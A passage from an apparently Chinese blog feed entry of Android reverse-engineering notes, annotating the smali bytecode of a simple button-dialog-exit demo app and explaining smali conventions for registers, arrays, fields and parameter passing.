   <span class="instruction"> const-string </span><span class="variable">v1</span>, <span class="string">"exit"</span>
    <span class="comment"># v1 = "exit"</span>
   <span class="instruction"> new-instance </span><span class="variable">v2</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;</span>
    <span class="comment"># 重新实例化一个clickButton类</span>
   <span class="instruction"> invoke-direct </span>{<span class="variable">v2</span>, <span class="variable">p0</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;</span><span class="function">-&gt;&lt;init&gt;(</span><span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span><span class="function">)</span>V
    <span class="comment"># ClickButton$1$1初始化，其父类为ClickButton$1</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>, <span class="variable">v1</span>, <span class="variable">v2</span>}, <span class="class">Landroid/app/AlertDialog$Builder;</span><span class="function">-&gt;setPositiveButton(</span><span class="class">Ljava/lang/CharSequence;</span><span class="class">Landroid/content/DialogInterface$OnClickListener;</span><span class="function">)</span><span class="class">Landroid/app/AlertDialog$Builder;</span>
    <span class="comment"># 调用v0的setPositiveButton方法，参数为v1, v2, v1 ="exit", v2 = DialogInterface$OnClickListener,即在exit按钮上添加了一个监听事件v2:ClickButton$1$1</span>
<span class="keyword">    .line</span> 33
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>}, <span class="class">Landroid/app/AlertDialog$Builder;</span><span class="function">-&gt;show(</span><span class="function">)</span><span class="class">Landroid/app/AlertDialog;</span>
    <span class="comment"># 调用v0的show方法</span>
<span class="keyword">    .line</span> 34
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre><p>exit退出事件代码</p>
<pre><code><span class="comment"># virtual methods</span>
<span class="keyword">.method</span><span class="keyword"> public</span><span class="function"> onClick(</span><span class="class">Landroid/content/DialogInterface;</span>I<span class="function">)</span>V
<span class="keyword">    .locals</span> 1
<span class="keyword">    .param</span> <span class="variable">p1</span>, <span class="string">"dialog"</span>    <span class="comment"># Landroid/content/DialogInterface;</span>
<span class="keyword">    .param</span> <span class="variable">p2</span>, <span class="string">"which"</span>    <span class="comment"># I</span>
    <span class="comment"># 传参 p1, p2, #后边为参数类型</span>
<span class="keyword">    .prologue</span>
<span class="keyword">    .line</span> 29
   <span class="instruction"> invoke-interface </span>{<span class="variable">p1</span>}, <span class="class">Landroid/content/DialogInterface;</span><span class="function">-&gt;dismiss(</span><span class="function">)</span>V
    <span class="comment"># 调用dialog中的dismiss()接口</span>
<span class="keyword">    .line</span> 30
   <span class="instruction"> iget-object </span><span class="variable">v0</span>, <span class="variable">p0</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;</span>-&gt;this$1:<span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>
   <span class="instruction"> iget-object </span><span class="variable">v0</span>, <span class="variable">v0</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>-&gt;this$0:<span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;finish(</span><span class="function">)</span>V
    <span class="comment"># 以上三行找到顶级父类对象，并调用finish关闭Activity</span>
<span class="keyword">    .line</span> 31
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre><h2 id="其他">其他</h2><h3 id="函数返回结果">函数返回结果</h3><p>在Java代码中调用函数和返回函数结果是一条语句完成的，而在smali里则需要分开来完成，在使用上述指令后，如果调用的函数返回非void，那么还需要用到move-result（返回基本数据类型）和move-result-object（返回对象）指令</p>
<h3 id="数组的表示形式">数组的表示形式</h3><p>[I——表示一个整型一维数组，相当于java中的int[]。<br>对于多维数组，只要增加[就行了。[[I相当于int[][]，[[[I相当于int[][][]。注意每一维的最多255个。<br>对象数组的表示：[Ljava/lang/String;表示一个String对象数组。</p>
<h3 id="字段的表示形式：">字段的表示形式：</h3><p>Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;<br>即包名，字段名和各字段类型。</p>
<h3 id="寄存器-1">寄存器</h3><p>在dalvik字节码中，寄存器都是32位的，能够支持任何类型。64位类型（Long和Double型）用2个寄存器表示。<br>有两种方式指定一个方法中有多少寄存器是可用的,.registers指令指定了方法中寄存器的总数,.locals指令表明了方法中非参寄存器的数量。</p>
<p>方法的传参<br>1.当一个方法被调用的时候，方法的参数被置于最后N个寄存器中。如果一个方法有2个参数，5个寄存器（v0-v4），那么参数将置于最后2个寄存器——v3和v4。</p>
<p>2.非静态方法中的第一个参数总是调用该方法的对象。<br>例如，非静态方法LMyObject;-&gt;callMe(II)V有2个整型参数，另外还有一个隐含的LMyObject;参数，所以总共有3个参数。<br>假如在该方法中指定了5个寄存器（v0-v4），以.registers方式指定5个或以.locals方式指定2个(即2个local寄存器+3个参数寄存器)。<br>当该方法被调用的时候，调用该方法的对象（即this引用）存放在v2中，第一个整型参数存放在v3中，第二个整型参数存放在v4中。</p>
<p>3.对于静态方法除了没有隐含的this参数外其它都一样。</p>
<h2 id="参考">参考</h2><p>1.函数调用部分参考 <a href="http://blog.csdn.net/lpohvbe/article/details/7981386" target="_blank" rel="external">APK反编译之一：基础知识</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>安卓逆向笔记,熟悉smali语法和函数调用<br>一个按钮程序,实现功能：点击 - 弹窗 - 退出</p>
<h2 id="源码">源码</h2><p>主功能代码</p>
<figure class="highlight java"><table><tr><td class]]>
    </summary>
    
      <category term="smali" scheme="http://blog.idhyt.com/tags/smali/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
</feed>
